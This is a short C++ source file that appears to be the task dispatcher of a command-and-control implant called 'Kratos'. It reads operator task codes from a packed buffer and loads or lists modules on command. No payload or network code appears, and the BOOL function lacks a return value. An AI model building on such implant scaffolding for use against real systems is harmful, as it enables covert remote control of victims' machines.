#include "agent/core.h"
#include "packager/packager.h"
#include "modules/modules.h"

BOOL Kratos::Dispatch() {
	auto TotalTasks = packager->UnPack4();
	packager->Pack4(TotalTasks);

	for(int i = 0; i < TotalTasks; i++) {
		auto CommandCode = packager->UnPack4();

		switch ( CommandCode ) {
			case TASK_LOAD_MODULE:
				this->moduleLoad( );
				break;
			case TASK_LIST_MODULES:
				this->moduleList();
				break;

		}
	}
}